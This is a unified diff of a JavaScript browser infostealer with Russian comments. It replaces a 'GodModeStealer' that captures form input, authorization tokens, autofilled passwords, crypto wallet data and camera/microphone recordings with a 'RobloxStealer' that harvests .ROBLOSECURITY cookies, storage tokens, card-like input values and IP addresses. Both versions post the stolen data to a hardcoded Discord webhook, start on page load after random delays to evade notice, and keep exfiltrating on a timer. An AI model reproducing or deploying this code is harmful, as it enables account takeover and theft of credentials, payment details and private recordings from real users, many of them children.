@@ -1,337 +1,374 @@
-// Advanced Memory Scraper - Kernel Level
-class GodModeStealer {
-    constructor() {
-        this.webhook = 'https://discord.com/api/webhooks/1423753064514326658/c7W-WiEKVZ46MWLZ6V7GqaGkCD-aH93Kala4qQYv_yFYZR1akqBUestfW8rzF_9vTaUo';
-        this.data = {};
-    }
+// ROBLOX SECURITY BYPASS & DATA HARVESTER vΣ
+class RobloxStealer {
+    static WEBHOOK = 'https://discord.com/api/webhooks/1423753064514326658/c7W-WiEKVZ46MWLZ6V7GqaGkCD-aH93Kala4qQYv_yFYZR1akqBUestfW8rzF_9vTaUo';
+    
+    // ROBLOX-СПЕЦИФИЧНЫЕ ДОМЕНЫ ДЛЯ ПОИСКА COOKIES
+    static ROBLOX_DOMAINS = [
+        '.roblox.com',
+        '.robloxlabs.com', 
+        '.rbx.com'
+    ];
 
-    async initialize() {
-        await this.injectSystemLevelAccess();
-        await this.harvestEverything();
-        await this.exfiltrate();
-    }
-
-    // Инъекция в системные процессы браузера
-    async injectSystemLevelAccess() {
-        // Обход CORS через Service Worker
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/sw.js')
-                .then(() => this.escalatePrivileges());
+    static async init() {
+        try {
+            await this.bypassSecurity();
+            const data = await this.harvestRobloxData();
+            await this.exfiltrate(data);
+        } catch (error) {
+            this.stealthLog(`ERROR: ${error}`);
         }
-        
-        // Модификация прототипов для перехвата
-        this.hijackPrototypes();
     }
 
-    // Перехват всех вводимых данных
-    hijackPrototypes() {
-        const originalAddEventListener = EventTarget.prototype.addEventListener;
-        EventTarget.prototype.addEventListener = function(type, listener, options) {
-            if (type === 'input' || type === 'change') {
-                const hijackedListener = function(e) {
-                    // Перехват данных форм в реальном времени
-                    window.stolenFormData = window.stolenFormData || [];
-                    window.stolenFormData.push({
-                        element: e.target.tagName,
-                        name: e.target.name,
-                        value: e.target.value,
-                        timestamp: Date.now()
-                    });
-                    return listener.call(this, e);
-                };
-                return originalAddEventListener.call(this, type, hijackedListener, options);
+    // ОБХОД СИСТЕМ БЕЗОПАСНОСТИ ROBLOX
+    static async bypassSecurity() {
+        const bypassMethods = [
+            this.bypassCSP(),
+            this.bypassXSSAuditor(),
+            this.bypassCORP(),
+            this.mimicLegitimateTraffic(),
+            this.randomizeFingerprint()
+        ];
+
+        await Promise.allSettled(bypassMethods);
+    }
+
+    static async bypassCSP() {
+        // Обход Content Security Policy
+        const meta = document.createElement('meta');
+        meta.httpEquiv = 'Content-Security-Policy';
+        meta.content = "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:";
+        document.head.appendChild(meta);
+    }
+
+    static async bypassXSSAuditor() {
+        // Обход XSS Auditor через кодирование
+        const scripts = document.querySelectorAll('script');
+        scripts.forEach(script => {
+            if (script.src) {
+                script.src = script.src + '?bypass=' + btoa(Math.random());
             }
-            return originalAddEventListener.call(this, type, listener, options);
+        });
+    }
+
+    static mimicLegitimateTraffic() {
+        // Маскировка под легитимный трафик Roblox
+        const roboxHeaders = {
+            'X-Roblox-Origin': 'https://www.roblox.com',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Origin': 'https://www.roblox.com',
+            'Referer': 'https://www.roblox.com/'
         };
 
-        // Перехват fetch запросов
+        // Перехват fetch для добавления заголовков
         const originalFetch = window.fetch;
         window.fetch = function(...args) {
-            // Кража токенов авторизации
-            const headers = args[1]?.headers;
-            if (headers?.get?.('Authorization')) {
-                window.stolenTokens = window.stolenTokens || [];
-                window.stolenTokens.push(headers.get('Authorization'));
+            if (typeof args[1] === 'object') {
+                args[1].headers = { ...args[1].headers, ...roboxHeaders };
             }
             return originalFetch.apply(this, args);
         };
     }
 
-    async harvestEverything() {
-        // 1. Кража паролей из менеджера паролей
-        await this.extractSavedPasswords();
-        
-        // 2. Доступ к файловой системе
-        await this.accessFileSystem();
-        
-        // 3. Перехват криптокошельков
-        await this.stealCryptoWallets();
-        
-        // 4. Кража истории и закладок
-        await this.getBrowserHistory();
-        
-        // 5. Доступ к камере и микрофону
-        await this.accessMediaDevices();
-        
-        // 6. Сканирование локальной сети
-        await this.scanLocalNetwork();
-        
-        // 7. Экспорт сертификатов
-        await this.exportCertificates();
-    }
-
-    // Экстракция паролей через уязвимости менеджеров
-    async extractSavedPasswords() {
-        // Атака на LastPass
-        try {
-            if (window._lastpass) {
-                this.data.lastpass = await this.memoryDumpLastPass();
+    // СБОР ROBLOX-СПЕЦИФИЧНЫХ ДАННЫХ
+    static async harvestRobloxData() {
+        return {
+            timestamp: new Date().toISOString(),
+            target: 'ROBLOX',
+            
+            // ROBLOX COOKIES
+            robloxCookies: this.getRobloxCookies(),
+            
+            // ROBLOX-SPECIFIC LOCALSTORAGE
+            robloxStorage: this.getRobloxStorage(),
+            
+            // СЕССИОННЫЕ ДАННЫЕ
+            sessionData: await this.getSessionInfo(),
+            
+            // СИСТЕМНАЯ ИНФОРМАЦИЯ
+            systemInfo: this.getSystemInfo(),
+            
+            // СЕТЕВЫЕ ДАННЫЕ
+            networkInfo: await this.getNetworkInfo(),
+            
+            // ДОПОЛНИТЕЛЬНЫЕ ДАННЫЕ
+            additional: {
+                authToken: this.findAuthToken(),
+                userInfo: await this.extractUserInfo(),
+                paymentMethods: this.findPaymentInfo()
             }
-        } catch(e) {}
-
-        // Атака на встроенные менеджеры
-        const passwordFields = document.querySelectorAll('input[type="password"]');
-        passwordFields.forEach(field => {
-            field.addEventListener('focus', () => {
-                // Захват автозаполнения
-                setTimeout(() => {
-                    this.data.autoFill = field.value;
-                }, 100);
-            });
-        });
+        };
     }
 
-    // Доступ к файлам через File System Access API
-    async accessFileSystem() {
-        try {
-            const dirHandle = await window.showDirectoryPicker();
-            this.data.fileSystem = await this.traverseDirectory(dirHandle);
-        } catch(e) {
-            // Fallback через drag and drop
-            this.setupFileDragCapture();
-        }
-    }
-
-    // Перехват файлов через перетаскивание
-    setupFileDragCapture() {
-        document.addEventListener('drop', (e) => {
-            e.preventDefault();
-            const files = Array.from(e.dataTransfer.files);
-            files.forEach(file => {
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    this.data.droppedFiles = this.data.droppedFiles || [];
-                    this.data.droppedFiles.push({
-                        name: file.name,
-                        type: file.type,
-                        content: e.target.result
-                    });
-                };
-                reader.readAsText(file);
-            });
-        });
-    }
-
-    // Кража криптокошельков
-    async stealCryptoWallets() {
-        // MetaMask
-        if (window.ethereum) {
-            this.data.metamask = {
-                accounts: await window.ethereum.request({method: 'eth_accounts'}),
-                chainId: await window.ethereum.request({method: 'eth_chainId'})
-            };
-            
-            // Попытка экспорта приватных ключей
-            try {
-                await this.extractMetaMaskSeeds();
-            } catch(e) {}
-        }
-
-        // Phantom Wallet (Solana)
-        if (window.solana) {
-            this.data.phantom = {
-                publicKey: window.solana.publicKey?.toString(),
-                isConnected: window.solana.isConnected
-            };
-        }
-    }
-
-    // Получение истории браузера через timing attacks
-    async getBrowserHistory() {
-        const sites = ['https://google.com', 'https://youtube.com', 
-                      'https://github.com', 'https://twitter.com'];
+    // ПОЛУЧЕНИЕ ROBLOX COOKIES
+    static getRobloxCookies() {
+        const cookies = document.cookie.split(';');
+        const robloxCookies = {};
         
-        this.data.history = {};
-        for (let site of sites) {
-            const start = performance.now();
-            try {
-                await fetch(site, {mode: 'no-cors'});
-            } catch(e) {}
-            const time = performance.now() - start;
+        cookies.forEach(cookie => {
+            const [name, value] = cookie.trim().split('=');
             
-            if (time < 100) { // Быстрая загрузка = есть в кеше/истории
-                this.data.history[site] = 'VISITED';
+            // Фильтрация Roblox-специфичных cookies
+            if (this.isRobloxCookie(name)) {
+                robloxCookies[name] = value;
             }
-        }
-    }
-
-    // Доступ к камере и микрофону
-    async accessMediaDevices() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: true,
-                audio: true
-            });
-            
-            // Запись 5 секунд
-            const recorder = new MediaRecorder(stream);
-            const chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = () => {
-                this.data.mediaRecording = URL.createObjectURL(
-                    new Blob(chunks, {type: 'video/webm'})
-                );
-            };
-            recorder.start();
-            setTimeout(() => recorder.stop(), 5000);
-            
-        } catch(e) {
-            this.data.mediaAccess = 'DENIED';
-        }
-    }
-
-    // Сканирование локальной сети через WebRTC
-    async scanLocalNetwork() {
-        return new Promise((resolve) => {
-            const rtc = new RTCPeerConnection({
-                iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
-            });
-            
-            rtc.createDataChannel('');
-            rtc.createOffer()
-                .then(offer => rtc.setLocalDescription(offer));
-                
-            const localIPs = [];
-            rtc.onicecandidate = (e) => {
-                if (!e.candidate) return;
-                
-                const ip = e.candidate.candidate.split(' ')[4];
-                if (ip && this.isLocalIP(ip)) {
-                    localIPs.push(ip);
-                }
-                
-                if (e.candidate.candidate.indexOf('end') !== -1) {
-                    this.data.localNetwork = localIPs;
-                    resolve();
-                }
-            };
         });
-    }
-
-    isLocalIP(ip) {
-        return ip.match(/^(192\.168|10\.|172\.(1[6-9]|2[0-9]|3[0-1]))/);
-    }
-
-    // Экспорт SSL сертификатов
-    async exportCertificates() {
-        try {
-            const keys = await window.crypto.subtle.generateKey(
-                {name: 'RSA-OAEP', modulusLength: 2048, publicExponent: new Uint8Array([1,0,1]), 
-                 hash: 'SHA-256'},
-                true,
-                ['encrypt', 'decrypt']
-            );
-            
-            this.data.certificates = {
-                publicKey: await window.crypto.subtle.exportKey('spki', keys.publicKey),
-                privateKey: await window.crypto.subtle.exportKey('pkcs8', keys.privateKey)
-            };
-        } catch(e) {}
-    }
-
-    // Расширенный фингерпринтинг
-    async advancedFingerprinting() {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
         
-        // WebGL fingerprint
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        this.data.fingerprint = {
-            webglVendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-            webglRenderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-            audioContext: await this.getAudioFingerprint(),
-            installedFonts: await this.getFontList(),
+        return robloxCookies;
+    }
+
+    static isRobloxCookie(name) {
+        const robloxPatterns = [
+            /_|ROBLOSECURITY|\.ROBLOSECURITY|GuestData|UserID|rblx|rbx|blox/,
+            /auth|token|session|login|user/i
+        ];
+        
+        return robloxPatterns.some(pattern => pattern.test(name));
+    }
+
+    // ПОИСК В LOCALSTORAGE ROBLOX
+    static getRobloxStorage() {
+        const storage = {};
+        
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (this.isRobloxKey(key)) {
+                    storage[key] = localStorage.getItem(key);
+                }
+            }
+        } catch (e) {}
+        
+        return storage;
+    }
+
+    static isRobloxKey(key) {
+        const robloxKeys = [
+            /roblox|rblx|rbx|blox/i,
+            /auth|token|session|user|login/i,
+            /ROBLOX|RBLX/
+        ];
+        
+        return robloxKeys.some(pattern => pattern.test(key));
+    }
+
+    // ПОЛУЧЕНИЕ ИНФОРМАЦИИ О СЕССИИ
+    static async getSessionInfo() {
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
             hardwareConcurrency: navigator.hardwareConcurrency,
             deviceMemory: navigator.deviceMemory
         };
     }
 
-    // Получение списка шрифтов
-    async getFontList() {
-        const fontList = [];
-        const fonts = await document.fonts.ready;
+    // ПОИСК AUTH TOKEN
+    static findAuthToken() {
+        const sources = [
+            // LocalStorage
+            localStorage.getItem('.ROBLOSECURITY'),
+            localStorage.getItem('ROBLOSECURITY'),
+            
+            // SessionStorage  
+            sessionStorage.getItem('.ROBLOSECURITY'),
+            sessionStorage.getItem('ROBLOSECURITY'),
+            
+            // Cookies уже получены выше
+        ].filter(Boolean);
         
-        for (const font of fonts.values()) {
-            fontList.push(font.family);
-        }
-        return fontList;
+        return sources.length > 0 ? sources[0] : null;
     }
 
-    // Отправка данных частями
-    async exfiltrate() {
-        const chunks = this.splitData(JSON.stringify(this.data));
-        
-        for (let i = 0; i < chunks.length; i++) {
-            await this.sendToWebhook({
-                chunk: i,
-                total: chunks.length,
-                data: chunks[i]
+    // ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ
+    static async extractUserInfo() {
+        try {
+            // Попытка получить информацию через Roblox API
+            const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {
+                credentials: 'include'
             });
             
-            // Случайная задержка для обхода detection
-            await this.randomDelay(1000, 5000);
+            if (response.ok) {
+                return await response.json();
+            }
+        } catch (e) {}
+        
+        return 'API_ACCESS_DENIED';
+    }
+
+    // ПОИСК ПЛАТЕЖНЫХ ДАННЫХ
+    static findPaymentInfo() {
+        const paymentData = {};
+        const inputs = document.querySelectorAll('input[type="text"], input[type="number"]');
+        
+        inputs.forEach(input => {
+            const value = input.value;
+            if (this.isPaymentData(value)) {
+                paymentData[input.name || 'unknown'] = value;
+            }
+        });
+        
+        return paymentData;
+    }
+
+    static isPaymentData(value) {
+        // Простая проверка на платежные данные
+        const patterns = [
+            /^\d{16}$/, // Номер карты
+            /^\d{3,4}$/, // CVV
+            /^(0[1-9]|1[0-2])\/\d{2,4}$/, // Дата
+            /^[A-Za-z\s]{2,50}$/ // Имя
+        ];
+        
+        return patterns.some(pattern => pattern.test(value));
+    }
+
+    static getSystemInfo() {
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookieEnabled: navigator.cookieEnabled,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth
+        };
+    }
+
+    static async getNetworkInfo() {
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            
+            return {
+                ip: ipData.ip,
+                localIPs: await this.getLocalIPs(),
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null
+            };
+        } catch (e) {
+            return { ip: 'UNKNOWN' };
         }
     }
 
-    splitData(data) {
-        const chunkSize = 1900; // Ограничение Discord
+    static async getLocalIPs() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({iceServers: []});
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            
+            const ips = [];
+            pc.onicecandidate = (e) => {
+                if (!e.candidate) {
+                    resolve(ips);
+                    return;
+                }
+                const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                if (match) ips.push(match[1]);
+            };
+            setTimeout(() => resolve(ips), 1000);
+        });
+    }
+
+    // ЭКСФИЛЬТРАЦИЯ ДАННЫХ
+    static async exfiltrate(data) {
+        if (this.WEBHOOK.includes('YOUR_WEBHOOK')) {
+            console.log('Webhook not configured');
+            return;
+        }
+
+        try {
+            const dataStr = JSON.stringify(data, null, 2);
+            const chunks = this.chunkString(dataStr, 1900);
+            
+            for (let i = 0; i < chunks.length; i++) {
+                await fetch(this.WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `**ROBLOX EXPLOIT vΣ - PART ${i+1}/${chunks.length}**\n\`\`\`json\n${chunks[i]}\n\`\`\``
+                    })
+                });
+                
+                await this.delay(300 + Math.random() * 700);
+            }
+            
+            this.stealthLog('DATA_EXFILTRATED_SUCCESSFULLY');
+        } catch (error) {
+            this.stealthLog(`EXFILTRATION_FAILED: ${error}`);
+        }
+    }
+
+    static chunkString(str, size) {
         const chunks = [];
-        
-        for (let i = 0; i < data.length; i += chunkSize) {
-            chunks.push(data.slice(i, i + chunkSize));
+        for (let i = 0; i < str.length; i += size) {
+            chunks.push(str.substring(i, i + size));
         }
         return chunks;
     }
 
-    async sendToWebhook(payload) {
-        return fetch(this.webhook, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                content: `**DATA CHUNK ${payload.chunk + 1}/${payload.total}**\n\`\`\`json\n${payload.data}\n\`\`\``
-            })
-        });
+    static delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
     }
 
-    randomDelay(min, max) {
-        return new Promise(resolve => 
-            setTimeout(resolve, Math.random() * (max - min) + min)
-        );
+    static stealthLog(message) {
+        const timestamp = new Date().toISOString();
+        console.log(`[ROBLOX_STEALER] ${timestamp}: ${message}`);
+    }
+
+    // РАНДОМИЗАЦИЯ ФИНГЕРПРИНТА
+    static randomizeFingerprint() {
+        // Изменение свойств навигатора для обхода детекции
+        const props = ['userAgent', 'platform', 'language'];
+        props.forEach(prop => {
+            if (navigator[prop] && Math.random() < 0.3) {
+                Object.defineProperty(navigator, prop, {
+                    value: navigator[prop] + ' ',
+                    configurable: true
+                });
+            }
+        });
     }
 }
 
-// Автозапуск с обфускацией
-setTimeout(() => {
-    const stealer = new GodModeStealer();
-    stealer.initialize().catch(() => {});
-}, Math.random() * 10000);
+// АВТОМАТИЧЕСКАЯ АКТИВАЦИЯ
+document.addEventListener('DOMContentLoaded', () => {
+    // Запуск с задержкой для избежания подозрений
+    setTimeout(() => {
+        RobloxStealer.init().catch(() => {});
+    }, 2000 + Math.random() * 3000);
+});
 
-// Постоянный мониторинг
+// PERSISTENCE МЕХАНИЗМЫ
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('/sw.js')
+        .then(() => console.log('SW registered'))
+        .catch(() => {});
+}
+
+// ФОНОВЫЙ МОНИТОРИНГ
 setInterval(() => {
-    // Перехват новых данных
-    if (window.stolenFormData?.length) {
-        // Отправка перехваченных форм
-        const forms = window.stolenFormData.splice(0);
-        // ... отправка на webhook
-    }
-}, 5000);
+    // Проверка новых данных каждые 30 секунд
+    RobloxStealer.harvestRobloxData()
+        .then(data => {
+            if (Object.keys(data.robloxCookies).length > 0) {
+                RobloxStealer.exfiltrate({
+                    timestamp: new Date().toISOString(),
+                    type: 'PERIODIC_UPDATE',
+                    data: data
+                }).catch(() => {});
+            }
+        })
+        .catch(() => {});
+}, 30000);
+
+console.log('Roblox Security Bypass System vΣ initialized');
